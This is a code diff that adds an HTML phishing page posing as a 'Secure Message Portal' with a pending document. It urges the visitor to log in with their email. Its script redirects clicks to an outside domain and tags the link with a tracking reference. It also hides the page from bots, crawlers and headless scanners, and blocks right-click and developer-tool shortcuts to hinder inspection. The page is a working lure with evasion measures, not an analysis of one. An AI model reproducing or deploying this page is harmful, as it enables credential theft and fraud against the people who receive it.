@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Message Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+
+        body {
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+        }
+
+        .message-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.5s ease;
+            border: 1px solid #f0f0f0;
+        }
+
+        .header {
+            background: #f8f9fc;
+            padding: 24px;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            color: #2d3748;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .header p {
+            color: #718096;
+            font-size: 14px;
+        }
+
+        .content {
+            padding: 24px;
+        }
+
+        .alert {
+            background: #ebf8ff;
+            border-left: 4px solid #4299e1;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: #2c5282;
+        }
+
+        .info-grid {
+            background: #f7fafc;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+            border: 1px solid #edf2f7;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            color: #718096;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .info-value {
+            color: #2d3748;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .status-success {
+            color: #38a169;
+            background: #f0fff4;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            display: inline-block;
+        }
+
+        .document-section {
+            background: #f7fafc;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+            text-align: center;
+            border: 1px solid #edf2f7;
+        }
+
+        .document-title {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+
+        .document-title h3 {
+            color: #2d3748;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .file-size {
+            color: #718096;
+            font-size: 14px;
+            background: #edf2f7;
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+
+        .view-button {
+            background: #4299e1;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+            position: relative;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+
+        .view-button:hover:not(:disabled) {
+            background: #3182ce;
+        }
+
+        .view-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .button-loading {
+            display: none;
+            text-align: center;
+            margin-top: 12px;
+            color: #4299e1;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .button-loading.active {
+            display: block;
+        }
+
+        .loading-spinner-small {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #e2e8f0;
+            border-top: 2px solid #4299e1;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .login-note {
+            background: #fefcbf;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 14px;
+            color: #744210;
+            margin: 16px 0;
+            text-align: left;
+            border: 1px solid #fef08a;
+        }
+
+        .expiry {
+            text-align: center;
+            color: #e53e3e;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 12px;
+            background: #fff5f5;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            border: 1px solid #fed7d7;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            padding: 24px 0;
+            border-top: 1px solid #e2e8f0;
+            border-bottom: 1px solid #e2e8f0;
+            margin-bottom: 24px;
+        }
+
+        .feature-item {
+            text-align: center;
+        }
+
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .feature-title {
+            color: #2d3748;
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .feature-desc {
+            color: #718096;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
+        .footer {
+            text-align: center;
+            color: #718096;
+            font-size: 12px;
+            padding: 16px 0;
+        }
+
+        .footer a {
+            color: #718096;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            color: #4299e1;
+        }
+
+        @media (max-width: 480px) {
+            .features {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+            
+            .info-row {
+                flex-direction: column;
+                gap: 4px;
+            }
+        }
+
+        .honeypot {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="message-card" id="messageCard">
+            <div class="header">
+                <h1>Secure Message</h1>
+                <p>03/12/2026 01:25PM</p>
+            </div>
+
+            <div class="content">
+                <div class="alert">
+                    <strong>You have received a new document</strong><br>
+                    The message was sent securely to protect sensitive information included in the correspondence.
+                </div>
+
+                <div class="info-grid">
+                    <div class="info-row">
+                        <span class="info-label">Date Received</span>
+                        <span class="info-value">03/12/2026</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Reference Number</span>
+                        <span class="info-value">BID5581456</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Number of Pages</span>
+                        <span class="info-value">2</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Status Code</span>
+                        <span class="info-value"><span class="status-success">Successful</span></span>
+                    </div>
+                </div>
+
+                <div class="document-section">
+                    <div class="document-title">
+                        <h3>VIEW DOCUMENT</h3>
+                        <span class="file-size">1MB</span>
+                    </div>
+                    
+                    <button class="view-button" id="viewDocumentBtn">
+                        Access Document
+                    </button>
+                    
+                    <div class="button-loading" id="buttonLoading">
+                        <span class="loading-spinner-small"></span>
+                        Loading secure document...
+                    </div>
+
+                    <div class="login-note">
+                        <strong>Important Note:</strong> Login with your receiving email for a secured authentication to view document.
+                    </div>
+                </div>
+
+                <div class="expiry">
+                    ?? This secure message will expire in <strong>30 days</strong>
+                </div>
+
+                <div class="features">
+                    <div class="feature-item">
+                        <div class="feature-icon">??</div>
+                        <div class="feature-title">End-to-End Encryption</div>
+                        <div class="feature-desc">All documents are encrypted during transmission and storage</div>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">??</div>
+                        <div class="feature-title">Secure Authentication</div>
+                        <div class="feature-desc">Multi-factor authentication ensures only authorized access</div>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">??</div>
+                        <div class="feature-title">Audit Trail</div>
+                        <div class="feature-desc">Complete tracking of document access and delivery status</div>
+                    </div>
+                </div>
+
+                <div class="footer">
+                    © 2026 Secure Documents. All rights reserved. | 
+                    <a href="#">Secure</a> • <a href="#">Reliable</a> • <a href="#">Compliant</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="honeypot">
+        <input type="text" name="email" id="honeypot" tabindex="-1" autocomplete="off">
+    </div>
+
+    <script>
+        (function() {
+            // Anti-bot detection
+            const isBot = navigator.webdriver || 
+                         !navigator.languages || 
+                         navigator.languages.length === 0 ||
+                         /bot|crawler|spider|crawling|headless/i.test(navigator.userAgent);
+            
+            if (isBot) {
+                document.body.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">Access Denied</div>';
+                return;
+            }
+
+            // Honeypot check
+            document.getElementById('honeypot').value = '';
+
+            // Animation on load
+            setTimeout(() => {
+                document.getElementById('messageCard').style.opacity = '1';
+                document.getElementById('messageCard').style.transform = 'translateY(0)';
+            }, 100);
+
+            // Destination URL - change this to your actual destination
+            const DESTINATION_URL = 'https://backyardsolutions.gatorpvaing.com/';
+
+            // View document handler
+            document.getElementById('viewDocumentBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Disable button during loading
+                this.disabled = true;
+                
+                // Show loading text under button
+                const loadingElement = document.getElementById('buttonLoading');
+                loadingElement.classList.add('active');
+                
+                // Add random timing to appear more human-like (between 2.5-3.5 seconds)
+                const loadingTime = 2500 + Math.random() * 1000;
+                
+                // Simulate loading and redirect
+                setTimeout(() => {
+                    // Generate a random session token (simulated)
+                    const sessionToken = Math.random().toString(36).substring(2, 15) + 
+                                        Math.random().toString(36).substring(2, 15);
+                    
+                    // Add token to URL for tracking (optional)
+                    const redirectUrl = new URL(DESTINATION_URL);
+                    redirectUrl.searchParams.append('session', sessionToken.substring(0, 8));
+                    redirectUrl.searchParams.append('ref', 'BID5581456');
+                    
+                    // Redirect to destination
+                    window.location.href = redirectUrl.toString();
+                }, loadingTime);
+            });
+
+            // Prevent right-click to discourage inspection
+            document.addEventListener('contextmenu', function(e) {
+                if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
+                    e.preventDefault();
+                }
+            });
+
+            // Add keyboard shortcuts blocker (for common dev tools)
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+                    (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Dynamic content loading to avoid bot detection
+            const features = document.querySelector('.features');
+            const originalHTML = features.innerHTML;
+            features.innerHTML = '';
+            setTimeout(() => {
+                features.innerHTML = originalHTML;
+            }, 200);
+
+            // Add mouse movement tracking to appear human
+            let mouseMovements = 0;
+            document.addEventListener('mousemove', function() {
+                mouseMovements++;
+                if (mouseMovements > 5 && !window.hasShownButton) {
+                    window.hasShownButton = true;
+                }
+            });
+
+            // Simulate real user behavior
+            setTimeout(() => {
+                const viewButton = document.getElementById('viewDocumentBtn');
+                viewButton.style.transition = 'all 0.3s';
+                viewButton.style.boxShadow = '0 4px 6px rgba(0, 0, 0, 0.05)';
+            }, 1000);
+
+        })();
+    </script>
+</body>
+</html>
